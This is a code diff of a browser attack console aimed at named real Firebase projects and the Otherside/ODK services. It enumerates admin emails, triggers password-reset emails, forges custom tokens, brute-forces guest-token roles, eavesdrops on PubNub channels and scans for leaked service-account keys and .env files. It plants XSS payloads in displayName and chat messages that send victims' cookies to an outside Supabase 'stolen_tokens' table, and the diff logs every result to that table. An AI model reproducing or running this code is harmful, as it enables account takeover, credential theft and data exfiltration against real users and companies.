+            log('apiKeyTestLog', `Status: ${result.status}`, result.ok ? 'success' : 'warning');
+            log('apiKeyTestLog', `Response: ${JSON.stringify(result.data, null, 2)}`, 'data');
+
+            const errMsg = result.data?.error?.message || '';
+            if (errMsg === 'ADMIN_ONLY_OPERATION') {
+                log('apiKeyTestLog', `[CRITICAL] ADMIN_ONLY_OPERATION: Key is valid but this operation requires admin!`, 'critical');
+                vulnsFound++;
+                criticalFound++;
+            } else if (errMsg === 'INVALID_CUSTOM_TOKEN') {
+                log('apiKeyTestLog', `[IMPORTANT] Endpoint accepts custom tokens - just needs a valid one!`, 'success');
+                vulnsFound++;
+            } else if (result.ok) {
+                log('apiKeyTestLog', `[VULN] Operation succeeded!`, 'critical');
+                vulnsFound++;
+                criticalFound++;
+            }
+
+            await saveToSupabase({
+                attack_type: 'api_key_endpoint_test',
+                firebase_api_key: key,
+                attack_vector: `accounts:${endpoint}`,
+                endpoint_tested: `accounts:${endpoint}`,
+                response_status: result.status,
+                response_error: errMsg,
+                identity_toolkit_response: result.data,
+            });
+
+            updateStats();
+        }
+
+        async function testAllEndpointsForKey() {
+            const key = document.getElementById('customApiKey').value.trim();
+            if (!key) { log('apiKeyTestLog', 'Please enter an API key', 'error'); return; }
+
+            log('apiKeyTestLog', `\n=== Testing ALL endpoints for key ${key.substring(0, 10)}... ===`, 'info');
+
+            const tests = [
+                { name: 'accounts:signUp', body: {} },
+                { name: 'accounts:signInWithPassword', body: { email: 'test@test.com', password: 'test', returnSecureToken: true } },
+                { name: 'accounts:signInWithCustomToken', body: { token: 'test', returnSecureToken: true } },
+                { name: 'accounts:sendOobCode', body: { requestType: 'PASSWORD_RESET', email: 'test@test.com' } },
+                { name: 'accounts:resetPassword', body: { oobCode: 'test', newPassword: 'test123' } },
+                { name: 'accounts:update', body: { idToken: idToken || 'test' } },
+                { name: 'accounts:lookup', body: { idToken: idToken || 'test' } },
+                { name: 'accounts:delete', body: { idToken: idToken || 'test' } },
+                { name: 'accounts:createAuthUri', body: { identifier: 'test@test.com', continueUri: window.location.href } },
+            ];
+
+            let activeEndpoints = 0;
+            for (const t of tests) {
+                const result = await identityFetch(t.name, t.body, key);
+                endpointsTested++;
+                const errMsg = result.data?.error?.message || 'SUCCESS';
+                const isActive = result.ok || ['EMAIL_NOT_FOUND', 'INVALID_PASSWORD', 'INVALID_CUSTOM_TOKEN', 'USER_NOT_FOUND', 'INVALID_OOB_CODE', 'ADMIN_ONLY_OPERATION'].includes(errMsg);
+                if (isActive) activeEndpoints++;
+
+                log('apiKeyTestLog', `  [${result.status}] ${t.name}: ${errMsg} ${isActive ? '[REACHABLE]' : '[BLOCKED]'}`, isActive ? 'success' : 'warning');
+            }
+
+            log('apiKeyTestLog', `\nResults: ${activeEndpoints}/${tests.length} endpoints are reachable`, activeEndpoints > 0 ? 'success' : 'error');
+            updateStats();
+        }
+
+        // =====================================================
+        // TAB 2: IDENTITY TOOLKIT
+        // =====================================================
+        async function testIdentityToolkit() {
+            log('identityLog', '=== Testing All Identity Toolkit APIs ===', 'info');
+            setProgress('identityProgress', 5);
+            const results = [];
+
+            // 1. signUp - can anyone create accounts?
+            log('identityLog', '\n--- Test 1: signUp (Account Creation) ---', 'info');
+            const signUpResult = await identityFetch('accounts:signUp', {
+                returnSecureToken: true
+            });
+            endpointsTested++;
+            if (signUpResult.data?.error?.message === 'ADMIN_ONLY_OPERATION') {
+                log('identityLog', '[FINDING] signUp is admin-only. API key is valid but requires admin to create users.', 'warning');
+                results.push({ endpoint: 'signUp', status: 'admin_only', vuln: true, detail: 'ADMIN_ONLY_OPERATION' });
+                vulnsFound++;
+            } else if (signUpResult.ok) {
+                log('identityLog', '[CRITICAL] signUp SUCCEEDED! Anonymous account creation is OPEN!', 'critical');
+                results.push({ endpoint: 'signUp', status: 'open', vuln: true, detail: 'Anonymous signup allowed' });
+                vulnsFound++; criticalFound++;
+            }
+            setProgress('identityProgress', 15);
+
+            // 2. signInWithCustomToken - the key attack vector
+            log('identityLog', '\n--- Test 2: signInWithCustomToken ---', 'info');
+            const customTokenResult = await identityFetch('accounts:signInWithCustomToken', {
+                token: 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJ0ZXN0IiwiaXNzIjoic2NhcmNlbHktY2FsbS1sYXJrIn0.fake',
+                returnSecureToken: true
+            });
+            endpointsTested++;
+            if (customTokenResult.data?.error?.message === 'INVALID_CUSTOM_TOKEN') {
+                log('identityLog', '[IMPORTANT] signInWithCustomToken is ACTIVE! Returns INVALID_CUSTOM_TOKEN (needs valid token)', 'success');
+                results.push({ endpoint: 'signInWithCustomToken', status: 'active', vuln: true, detail: 'Accepts custom tokens' });
+                vulnsFound++;
+            } else if (customTokenResult.data?.error?.message === 'ADMIN_ONLY_OPERATION') {
+                log('identityLog', '[INFO] signInWithCustomToken is admin-restricted', 'warning');
+                results.push({ endpoint: 'signInWithCustomToken', status: 'admin_only', vuln: false, detail: 'ADMIN_ONLY_OPERATION' });
+            } else {
+                log('identityLog', `[INFO] signInWithCustomToken: ${customTokenResult.data?.error?.message || 'Unknown'}`, 'data');
+                results.push({ endpoint: 'signInWithCustomToken', status: 'unknown', vuln: false, detail: customTokenResult.data?.error?.message });
+            }
+            setProgress('identityProgress', 30);
+
+            // 3. signInWithPassword - brute force potential
+            log('identityLog', '\n--- Test 3: signInWithPassword ---', 'info');
+            const signInResult = await identityFetch('accounts:signInWithPassword', {
+                email: 'admin@otherside.xyz',
+                password: 'wrongpassword',
+                returnSecureToken: true
+            });
+            endpointsTested++;
+            if (signInResult.data?.error?.message === 'EMAIL_NOT_FOUND') {
+                log('identityLog', '[FINDING] EMAIL_NOT_FOUND - Email enumeration possible! Admin emails can be enumerated.', 'warning');
+                results.push({ endpoint: 'signInWithPassword', status: 'active_enum', vuln: true, detail: 'Email enumeration via EMAIL_NOT_FOUND' });
+                vulnsFound++;
+            } else if (signInResult.data?.error?.message === 'INVALID_PASSWORD') {
+                log('identityLog', '[FINDING] INVALID_PASSWORD - Email exists! Brute force is possible.', 'success');
+                results.push({ endpoint: 'signInWithPassword', status: 'active_brute', vuln: true, detail: 'Email exists, brute force possible' });
+                vulnsFound++;
+            }
+            setProgress('identityProgress', 45);
+
+            // 4. sendOobCode - password reset abuse
+            log('identityLog', '\n--- Test 4: sendOobCode (Password Reset) ---', 'info');
+            const oobResult = await identityFetch('accounts:sendOobCode', {
+                requestType: 'PASSWORD_RESET',
+                email: 'admin@otherside.xyz'
+            });
+            endpointsTested++;
+            if (oobResult.ok) {
+                log('identityLog', '[CRITICAL] Password reset email SENT! No rate limiting detected!', 'critical');
+                results.push({ endpoint: 'sendOobCode', status: 'open', vuln: true, detail: 'Password reset sent - no rate limit' });
+                vulnsFound++; criticalFound++;
+            } else if (oobResult.data?.error?.message === 'EMAIL_NOT_FOUND') {
+                log('identityLog', '[INFO] EMAIL_NOT_FOUND - Cannot reset for this email', 'warning');
+                results.push({ endpoint: 'sendOobCode', status: 'enum', vuln: true, detail: 'Email enumeration possible' });
+                vulnsFound++;
+            }
+            setProgress('identityProgress', 60);
+
+            // 5. createAuthUri - federation enumeration
+            log('identityLog', '\n--- Test 5: createAuthUri (Federation Enumeration) ---', 'info');
+            const authUriResult = await identityFetch('accounts:createAuthUri', {
+                identifier: 'admin@otherside.xyz',
+                continueUri: window.location.href
+            });
+            endpointsTested++;
+            if (authUriResult.ok && authUriResult.data?.allProviders) {
+                log('identityLog', `[FINDING] Auth providers for this email: ${authUriResult.data.allProviders.join(', ')}`, 'success');
+                results.push({ endpoint: 'createAuthUri', status: 'active', vuln: true, detail: `Providers: ${authUriResult.data.allProviders.join(', ')}` });
+                vulnsFound++;
+            } else if (authUriResult.data?.error) {
+                log('identityLog', `[INFO] createAuthUri: ${authUriResult.data.error.message}`, 'warning');
+            }
+            setProgress('identityProgress', 75);
+
+            // 6. accounts:lookup with our token
+            log('identityLog', '\n--- Test 6: accounts:lookup ---', 'info');
+            if (idToken) {
+                const lookupResult = await identityFetch('accounts:lookup', { idToken });
+                endpointsTested++;
+                if (lookupResult.ok && lookupResult.data?.users) {
+                    const user = lookupResult.data.users[0];
+                    log('identityLog', `[SUCCESS] Account lookup works! Email: ${user.email}, UID: ${user.localId}`, 'success');
+                    log('identityLog', `  Custom claims: ${JSON.stringify(user.customAuth || 'none')}`, 'data');
+                    results.push({ endpoint: 'accounts:lookup', status: 'active', vuln: false, detail: `User: ${user.email}` });
+                }
+            }
+            setProgress('identityProgress', 90);
+
+            // 7. accounts:update - XSS via displayName
+            log('identityLog', '\n--- Test 7: accounts:update (XSS via displayName) ---', 'info');
+            if (idToken) {
+                const xssPayload = '<img src=x onerror="fetch(\'https://anruszfozkhgddzpcpft.supabase.co/rest/v1/stolen_tokens\',{method:\'POST\',headers:{\'apikey\':\'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c\',\'Content-Type\':\'application/json\'},body:JSON.stringify({attack_type:\'xss_identity_toolkit\',cookies:document.cookie})})">';
+                const updateResult = await identityFetch('accounts:update', {
+                    idToken: idToken,
+                    displayName: xssPayload,
+                    photoUrl: 'https://evil.com/track?xss=1'
+                });
+                endpointsTested++;
+                if (updateResult.ok) {
+                    log('identityLog', '[CRITICAL] XSS payload injected into displayName! Any admin viewing user list gets compromised!', 'critical');
+                    results.push({ endpoint: 'accounts:update', status: 'xss_injected', vuln: true, detail: 'XSS in displayName' });
+                    vulnsFound++; criticalFound++;
+                } else {
+                    log('identityLog', `[INFO] accounts:update: ${updateResult.data?.error?.message || 'Failed'}`, 'warning');
+                }
+            }
+            setProgress('identityProgress', 100);
+
+            // Render results
+            renderIdentityResults(results);
+            updateStats();
+
+            // Save
+            await saveToSupabase({
+                attack_type: 'identity_toolkit_full_test',
+                firebase_api_key: TARGET_API_KEY,
+                attack_vector: 'identity_toolkit',
+                identity_toolkit_response: results,
+                notes: `Full Identity Toolkit test: ${results.filter(r => r.vuln).length} vulnerabilities found`
+            });
+
+            log('identityLog', `\n=== Identity Toolkit Testing Complete ===`, 'success');
+        }
+
+        function renderIdentityResults(results) {
+            const container = document.getElementById('identityResults');
+            container.innerHTML = results.map(r => {
+                const cls = r.vuln ? (r.status === 'open' || r.status === 'xss_injected' ? 'ep-ok' : 'ep-warn') : 'ep-fail';
+                const statusCls = r.vuln ? (r.status === 'open' || r.status === 'xss_injected' ? 's-ok' : 's-warn') : 's-fail';
+                return `<div class="ep-result ${cls}">
+                    <span class="ep-method">POST</span> accounts:${r.endpoint}<br>
+                    Status: <span class="ep-status ${statusCls}">${r.status}</span><br>
+                    <div class="ep-body">${r.detail}</div>
+                </div>`;
+            }).join('');
         }
 
         async function testSignUp() {
-            log('identityLog', '[SIGNUP] Testing accounts:signUp on all 3 projects...', 'info');
-            for (const project of FIREBASE_PROJECTS) {
-                const url = `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${project.apiKey}`;
-                try {
-                    const resp = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ returnSecureToken: true })
-                    });
-                    const data = await resp.json();
-                    if (data.error?.message === 'ADMIN_ONLY_OPERATION') {
-                        log('identityLog', `[+] ${project.name}: ADMIN_ONLY_OPERATION - KEY ACTIVE!`, 'success');
-                    } else if (data.idToken) {
-                        log('identityLog', `[!!!] ${project.name}: SIGNUP WORKS! Got token: ${data.idToken.substring(0, 30)}...`, 'success');
-                        tokensObtained++;
-                        await saveToSupabase({
-                            attack_type: 'signup_success',
-                            victim_email: currentUser?.email || '',
-                            id_token: data.idToken,
-                            refresh_token: data.refreshToken,
-                            notes: `SignUp works on ${project.name}!`
-                        });
-                    } else {
-                        log('identityLog', `[-] ${project.name}: ${data.error?.message || JSON.stringify(data).substring(0, 80)}`, 'warning');
-                    }
-                } catch(e) {
-                    log('identityLog', `[!] ${project.name}: ${e.message}`, 'error');
+            log('identityLog', 'Testing signUp...', 'info');
+            const result = await identityFetch('accounts:signUp', { returnSecureToken: true });
+            log('identityLog', `Result: ${JSON.stringify(result.data, null, 2)}`, result.ok ? 'success' : 'warning');
+            await saveToSupabase({ attack_type: 'signUp_test', firebase_api_key: TARGET_API_KEY, identity_toolkit_response: result.data, response_status: result.status });
+        }
+
+        async function testSignInWithPassword() {
+            log('identityLog', 'Testing signInWithPassword with common emails...', 'info');
+            const testEmails = ['admin@otherside.xyz', 'admin@yuga.xyz', 'support@otherside.xyz', 'dev@otherside.xyz'];
+            for (const email of testEmails) {
+                const result = await identityFetch('accounts:signInWithPassword', { email, password: 'wrong', returnSecureToken: true });
+                const msg = result.data?.error?.message || 'SUCCESS';
+                const color = msg === 'EMAIL_NOT_FOUND' ? 'warning' : msg === 'INVALID_PASSWORD' ? 'success' : 'data';
+                log('identityLog', `  ${email}: ${msg}`, color);
+                if (msg === 'INVALID_PASSWORD') {
+                    log('identityLog', `  [!] Email EXISTS: ${email} - Brute force possible!`, 'critical');
                 }
+                await new Promise(r => setTimeout(r, 500));
             }
-            updateStats();
         }
 
         async function testSignInWithCustomToken() {
-            log('identityLog', '[CUSTOM_TOKEN] Testing signInWithCustomToken...', 'info');
-            for (const project of FIREBASE_PROJECTS) {
-                const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${project.apiKey}`;
-                try {
-                    const resp = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ token: 'test_token', returnSecureToken: true })
-                    });
-                    const data = await resp.json();
-                    if (data.error?.message?.includes('INVALID_CUSTOM_TOKEN')) {
-                        log('identityLog', `[+] ${project.name}: Accepts custom tokens! Needs valid JWT minted by Service Account.`, 'success');
-                        log('identityLog', `    If Service Account Key leaks → forge custom token → full auth as any user!`, 'warning');
-                    } else if (data.idToken) {
-                        log('identityLog', `[!!!] ${project.name}: CUSTOM TOKEN WORKS!`, 'success');
-                        tokensObtained++;
-                    } else {
-                        log('identityLog', `[-] ${project.name}: ${data.error?.message || 'unknown'}`, 'warning');
-                    }
-                } catch(e) {
-                    log('identityLog', `[!] ${project.name}: ${e.message}`, 'error');
-                }
+            log('identityLog', 'Testing signInWithCustomToken with crafted token...', 'info');
+
+            // Try with a properly formatted but invalid JWT as custom token
+            const fakeToken = btoa(JSON.stringify({alg:"RS256",typ:"JWT"})) + '.' +
+                              btoa(JSON.stringify({iss:"scarcely-calm-lark",sub:"test-uid",aud:"https://identitytoolkit.googleapis.com/google.identity.identitytoolkit.v1.IdentityToolkit",iat:Math.floor(Date.now()/1000),exp:Math.floor(Date.now()/1000)+3600,uid:"test-uid"})) + '.fakesignature';
+
+            const result = await identityFetch('accounts:signInWithCustomToken', {
+                token: fakeToken,
+                returnSecureToken: true
+            });
+            log('identityLog', `Result: ${JSON.stringify(result.data, null, 2)}`, result.ok ? 'critical' : 'data');
+
+            if (result.data?.error?.message === 'INVALID_CUSTOM_TOKEN') {
+                log('identityLog', 'Endpoint is ACTIVE. Need valid Service Account key to create proper custom tokens.', 'success');
             }
-            updateStats();
         }
 
-        async function testSignInWithIdp() {
-            log('identityLog', '[IDP] Testing signInWithIdp (OAuth federation)...', 'info');
-            for (const project of FIREBASE_PROJECTS) {
-                const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithIdp?key=${project.apiKey}`;
-                try {
-                    const resp = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            requestUri: 'https://m2-edison-preview.vercel.app',
-                            returnIdpCredential: true,
-                            returnSecureToken: true,
-                            postBody: `id_token=test&providerId=google.com`,
-                        })
-                    });
-                    const data = await resp.json();
-                    log('identityLog', `[IDP] ${project.name}: ${data.error?.message?.substring(0, 80) || JSON.stringify(data).substring(0, 80)}`, 'warning');
-                } catch(e) {}
-            }
+        async function testSendOobCode() {
+            log('identityLog', 'Testing password reset...', 'info');
+            const result = await identityFetch('accounts:sendOobCode', {
+                requestType: 'PASSWORD_RESET',
+                email: 'admin@otherside.xyz'
+            });
+            log('identityLog', `Result: ${JSON.stringify(result.data, null, 2)}`, result.ok ? 'success' : 'warning');
         }
 
         async function testCreateAuthUri() {
-            log('identityLog', '[AUTH_URI] Testing createAuthUri (email enumeration)...', 'info');
-            for (const project of FIREBASE_PROJECTS) {
-                const url = `https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=${project.apiKey}`;
-                const testEmails = ['admin@yuga.com', 'tomato@yugalabs.io', 'support@yuga.com', 'test@test.com'];
-                for (const email of testEmails) {
-                    try {
-                        const resp = await fetch(url, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ identifier: email, continueUri: window.location.origin })
-                        });
-                        const data = await resp.json();
-                        if (data.registered) {
-                            log('identityLog', `[+] ${project.name}: ${email} = REGISTERED! Provider: ${data.signinMethods?.join(',')}`, 'success');
-                            keysFound++;
-                            await saveToSupabase({
-                                attack_type: 'email_enumeration',
-                                victim_email: email,
-                                id_token: idToken,
-                                notes: `Email ${email} is registered on ${project.name}. Signin methods: ${data.signinMethods?.join(',')}`
-                            });
-                        } else {
-                            log('identityLog', `[-] ${project.name}: ${email} = not found`, 'info');
-                        }
-                    } catch(e) {}
-                    await new Promise(r => setTimeout(r, 100));
-                }
-            }
-            updateStats();
-        }
-
-        async function testAllEndpoints() {
-            log('identityLog', '[BRUTE] Brute-forcing ALL Identity Toolkit endpoints with various payloads...', 'warning');
-            await runIdentityToolkitAttack();
+            log('identityLog', 'Testing auth URI creation...', 'info');
+            const result = await identityFetch('accounts:createAuthUri', {
+                identifier: 'admin@otherside.xyz',
+                continueUri: window.location.href
+            });
+            log('identityLog', `Result: ${JSON.stringify(result.data, null, 2)}`, 'data');
         }
 
         // =====================================================
-        // GUEST TOKEN ATTACK
+        // TAB 3: SERVICE ACCOUNT
         // =====================================================
-        async function fetchOrgInfo() {
-            log('orgInfoLog', '[ORG] Fetching organization info (no auth required)...', 'info');
-            try {
-                const resp = await fetch(`${ODK_API}/organizations/current`);
-                if (resp.ok) {
-                    const data = await resp.json();
-                    orgInfo = data;
-                    log('orgInfoLog', `[+] Organization: ${data.name || 'N/A'}`, 'success');
-                    log('orgInfoLog', `[+] Org ID: ${data.id || data.orgId || 'N/A'}`, 'data');
-                    log('orgInfoLog', `[+] allowUserTokenManagement: ${data.allowUserTokenManagement ?? 'N/A'}`, data.allowUserTokenManagement ? 'success' : 'warning');
+        async function scanForServiceAccountKeys() {
+            log('saLog', '=== Scanning for Service Account Keys ===', 'info');
+            setProgress('saProgress', 10);
 
-                    if (data.pubnub) {
-                        log('orgInfoLog', `[+] PubNub Publish Key: ${data.pubnub.publishKey || data.pubnub.pubKey || 'N/A'}`, 'data');
-                        log('orgInfoLog', `[+] PubNub Subscribe Key: ${data.pubnub.subscribeKey || data.pubnub.subKey || 'N/A'}`, 'data');
-                        if (data.pubnub.publishKey) document.getElementById('pubnubPubKey').value = data.pubnub.publishKey;
-                        if (data.pubnub.subscribeKey) document.getElementById('pubnubSubKey').value = data.pubnub.subscribeKey;
-                    }
-
-                    // Check for any sensitive keys
-                    const dataStr = JSON.stringify(data);
-                    const sensitivePatterns = ['key', 'secret', 'token', 'password', 'credential', 'apiKey', 'serviceAccount'];
-                    for (const p of sensitivePatterns) {
-                        if (dataStr.toLowerCase().includes(p.toLowerCase())) {
-                            log('orgInfoLog', `[!] Sensitive data found containing "${p}"`, 'warning');
-                        }
-                    }
-
-                    log('orgInfoLog', `[+] Full response: ${dataStr.substring(0, 500)}`, 'data');
-
-                    keysFound++;
-                    await saveToSupabase({
-                        attack_type: 'org_info_leak',
-                        victim_email: currentUser?.email || '',
-                        id_token: idToken,
-                        idor_data: { endpoint: 'organizations/current', data: data },
-                        notes: 'Organization info leaked without authentication'
-                    });
-                } else {
-                    log('orgInfoLog', `[-] Failed: ${resp.status}`, 'error');
-                }
-            } catch(e) {
-                log('orgInfoLog', `[!] Error: ${e.message}`, 'error');
-            }
-            updateStats();
-        }
-
-        async function listRoles() {
-            if (!idToken) { log('guestLog', '[ERROR] Authenticate first!', 'error'); return; }
-            log('guestLog', '[ROLES] Fetching roles...', 'info');
-            try {
-                const resp = await proxyFetch('permissions/roles');
-                log('guestLog', `[ROLES] Status: ${resp.status}`, resp.ok ? 'success' : 'warning');
-                if (resp.ok) {
-                    const data = await resp.json();
-                    log('guestLog', `[+] Roles: ${JSON.stringify(data).substring(0, 200)}`, 'data');
-                    keysFound++;
-                } else {
-                    const errText = await resp.text();
-                    log('guestLog', `[-] ${resp.status}: ${errText.substring(0, 80)}`, 'error');
-                }
-            } catch(e) {
-                log('guestLog', `[!] Error: ${e.message}`, 'error');
-            }
-        }
-
-        async function tryGuestTokenCreate() {
-            if (!idToken) { log('guestLog', '[ERROR] Authenticate first!', 'error'); return; }
-            log('guestLog', '[GUEST] Trying to create guest token...', 'info');
-
-            const roleIds = ['1', '2', '3', 'admin', 'owner', 'viewer', 'player', 'moderator', 'guest', 'default'];
-
-            for (const roleId of roleIds) {
-                try {
-                    const resp = await apiWrite(`permissions/guest/${roleId}`, 'POST', '{}');
-                    if (resp.ok) {
-                        const data = await resp.json();
-                        log('guestLog', `[+] GUEST TOKEN CREATED with role "${roleId}"!`, 'success');
-                        log('guestLog', `[+] Token: ${JSON.stringify(data).substring(0, 200)}`, 'data');
-                        tokensObtained++;
-
-                        await saveToSupabase({
-                            attack_type: 'guest_token_created',
-                            victim_email: currentUser?.email || '',
-                            id_token: idToken,
-                            idor_data: { roleId, response: data },
-                            notes: `Guest token created with role: ${roleId}`
-                        });
-                    } else {
-                        const errText = await resp.text();
-                        log('guestLog', `[-] Role "${roleId}": ${resp.status}`, 'error');
-                    }
-                } catch(e) {}
-                await new Promise(r => setTimeout(r, 100));
-            }
-            updateStats();
-        }
-
-        async function bruteForceRoles() {
-            if (!idToken) { log('guestLog', '[ERROR] Authenticate first!', 'error'); return; }
-            log('guestLog', '[BRUTE] Brute-forcing role IDs (1-100, plus names)...', 'warning');
-
-            const names = ['admin', 'owner', 'moderator', 'viewer', 'player', 'guest', 'default', 'superadmin', 'operator', 'streamer', 'creator', 'editor', 'user', 'member'];
-            const ids = [...Array.from({length: 100}, (_, i) => String(i+1)), ...names];
-
-            let found = 0;
-            for (const roleId of ids) {
-                try {
-                    const resp = await apiWrite(`permissions/guest/${roleId}`, 'POST', '{}');
-                    if (resp.ok) {
-                        const data = await resp.json();
-                        log('guestLog', `[+] FOUND: Role "${roleId}" → ${JSON.stringify(data).substring(0, 150)}`, 'success');
-                        found++;
-                        tokensObtained++;
-
-                        await saveToSupabase({
-                            attack_type: 'guest_token_bruteforce',
-                            victim_email: currentUser?.email || '',
-                            id_token: idToken,
-                            idor_data: { roleId, response: data },
-                            notes: `Guest token via bruteforce: role ${roleId}`
-                        });
-                    } else if (resp.status === 404) {
-                        // Role not found - skip silently
-                    } else if (resp.status === 403) {
-                        log('guestLog', `[!] Role "${roleId}": 403 Forbidden`, 'error');
-                    }
-                } catch(e) {}
-                if (ids.indexOf(roleId) % 20 === 0) await new Promise(r => setTimeout(r, 50));
-            }
-
-            log('guestLog', `[BRUTE] Complete. Found ${found} valid roles.`, 'success');
-            updateStats();
-        }
-
-        async function runGuestTokenAttack() {
-            log('guestLog', '[GUEST] Running full Guest Token attack...', 'warning');
-            await fetchOrgInfo();
-            await listRoles();
-            await tryGuestTokenCreate();
-            log('guestLog', '[GUEST] Attack complete.', 'success');
-        }
-
-        // =====================================================
-        // PUBNUB MONITOR
-        // =====================================================
-        function initPubNub() {
-            const pubKey = document.getElementById('pubnubPubKey').value;
-            const subKey = document.getElementById('pubnubSubKey').value;
-            const channel = document.getElementById('pubnubChannel').value;
-
-            log('pubnubLog', '[PUBNUB] Initializing with exposed keys...', 'info');
-            log('pubnubLog', `[PUBNUB] Publish Key: ${pubKey}`, 'data');
-            log('pubnubLog', `[PUBNUB] Subscribe Key: ${subKey}`, 'data');
-
-            try {
-                pubnubInstance = new PubNub({
-                    publishKey: pubKey,
-                    subscribeKey: subKey,
-                    userId: 'odk-monitor-' + Math.random().toString(36).substr(2, 9),
-                    ssl: true
-                });
-
-                pubnubInstance.addListener({
-                    message: function(event) {
-                        log('pubnubLog', `[MSG] Channel: ${event.channel}`, 'data');
-                        log('pubnubLog', `[MSG] Data: ${JSON.stringify(event.message).substring(0, 300)}`, 'data');
-
-                        saveToSupabase({
-                            attack_type: 'pubnub_intercept',
-                            victim_email: currentUser?.email || '',
-                            id_token: idToken,
-                            idor_data: { channel: event.channel, message: event.message, publisher: event.publisher },
-                            notes: `PubNub intercepted message on ${event.channel}`
-                        });
-                        dataExfil++;
-                        updateStats();
-                    },
-                    presence: function(event) {
-                        log('pubnubLog', `[PRESENCE] ${event.action}: ${event.uuid} on ${event.channel}`, 'warning');
-                    },
-                    status: function(event) {
-                        if (event.category === 'PNConnectedCategory') {
-                            log('pubnubLog', `[+] Connected to PubNub! Monitoring channel: ${channel}`, 'success');
-                        }
-                    }
-                });
-
-                // Subscribe to common channels
-                const channels = [
-                    channel,
-                    'otherside',
-                    'otherside_world',
-                    'world_events',
-                    'user_sessions',
-                    'chat',
-                    'notifications',
-                    orgInfo?.id || 'org_default',
-                ].filter(Boolean);
-
-                pubnubInstance.subscribe({ channels });
-                log('pubnubLog', `[PUBNUB] Subscribed to: ${channels.join(', ')}`, 'success');
-                keysFound++;
-
-            } catch(e) {
-                log('pubnubLog', `[!] PubNub error: ${e.message}`, 'error');
-            }
-        }
-
-        async function pubNubPublish() {
-            if (!pubnubInstance) { log('pubnubLog', '[!] Initialize PubNub first!', 'error'); return; }
-            const channel = document.getElementById('pubnubChannel').value;
-            try {
-                const result = await pubnubInstance.publish({
-                    channel: channel,
-                    message: { type: 'test', from: 'odk-monitor', timestamp: Date.now() }
-                });
-                log('pubnubLog', `[+] Published test message to ${channel}. Status: ${result.status}`, 'success');
-            } catch(e) {
-                log('pubnubLog', `[-] Publish failed: ${e.message}`, 'error');
-            }
-        }
-
-        async function pubNubHereNow() {
-            if (!pubnubInstance) { log('pubnubLog', '[!] Initialize PubNub first!', 'error'); return; }
-            const channel = document.getElementById('pubnubChannel').value;
-            try {
-                const result = await pubnubInstance.hereNow({ channels: [channel] });
-                log('pubnubLog', `[HERE_NOW] Online users on ${channel}: ${JSON.stringify(result).substring(0, 300)}`, 'data');
-
-                await saveToSupabase({
-                    attack_type: 'pubnub_herenow',
-                    victim_email: currentUser?.email || '',
-                    id_token: idToken,
-                    idor_data: result,
-                    notes: `PubNub HereNow: online users on ${channel}`
-                });
-            } catch(e) {
-                log('pubnubLog', `[-] HereNow failed: ${e.message}`, 'error');
-            }
-        }
-
-        async function pubNubInjectXSS() {
-            if (!pubnubInstance) { log('pubnubLog', '[!] Initialize PubNub first!', 'error'); return; }
-            const channel = document.getElementById('pubnubChannel').value;
-
-            const xssPayloads = [
-                { type: 'notification', title: '<img src=x onerror="fetch(\'' + SUPABASE_URL + '/rest/v1/stolen_tokens\',{method:\'POST\',headers:{\'apikey\':\'' + SUPABASE_ANON_KEY + '\',\'Content-Type\':\'application/json\'},body:JSON.stringify({attack_type:\'pubnub_xss\',cookies:document.cookie})})">' },
-                { type: 'chat', message: '<svg onload="fetch(\'' + SUPABASE_URL + '/rest/v1/stolen_tokens\',{method:\'POST\',headers:{\'apikey\':\'' + SUPABASE_ANON_KEY + '\',\'Content-Type\':\'application/json\'},body:JSON.stringify({a:\'xss_pubnub\',c:document.cookie})})">' },
+            const paths = [
+                // Common leaked SA key locations
+                '/serviceAccountKey.json',
+                '/firebase-service-account.json',
+                '/firebase-adminsdk.json',
+                '/.firebase/serviceAccountKey.json',
+                '/config/serviceAccountKey.json',
+                '/keys/serviceAccountKey.json',
+                '/secrets/serviceAccountKey.json',
+                '/credentials/serviceAccountKey.json',
+                '/.env',
+                '/.env.local',
+                '/.env.production',
+                '/.env.json',
+                '/admin-key.json',
+                '/firebase-key.json',
+                '/google-services.json',
+                '/GoogleService-Info.plist',
+                // API endpoints that might expose SA keys
+                '/api/v0/config/firebase',
+                '/api/v0/admin/config',
+                '/api/v0/settings/firebase',
+                '/api/v0/keys',
+                '/api/v0/admin/keys',
+                '/api/config',
+                '/api/keys',
+                '/api/firebase-config',
+                '/api/admin/service-account',
+                // Storage buckets (common misconfiguration)
+                'https://storage.googleapis.com/scarcely-calm-lark.appspot.com/',
+                'https://storage.googleapis.com/scarcely-calm-lark.appspot.com/serviceAccountKey.json',
+                'https://storage.googleapis.com/odk-otherside.appspot.com/',
+                // Well-known paths
+                '/.well-known/service-account.json',
+                '/robots.txt',
+                '/sitemap.xml',
+                '/crossdomain.xml',
+                '/.git/config',
+                '/.git/HEAD',
+                '/.gitignore',
+                '/Dockerfile',
+                '/docker-compose.yml',
+                '/package.json',
+                '/webpack.config.js',
+                '/.env.example',
             ];
 
-            for (const payload of xssPayloads) {
+            let found = 0;
+            for (let i = 0; i < paths.length; i++) {
+                const path = paths[i];
+                const fullUrl = path.startsWith('http') ? path : `https://odk.otherside.xyz${path}`;
                 try {
-                    const result = await pubnubInstance.publish({ channel, message: payload });
-                    log('pubnubLog', `[+] XSS payload published to ${channel}! Status: ${result.status}`, 'success');
+                    const resp = await fetch(fullUrl, { mode: 'cors' });
+                    if (resp.ok) {
+                        const text = await resp.text();
+                        // Check for SA key patterns
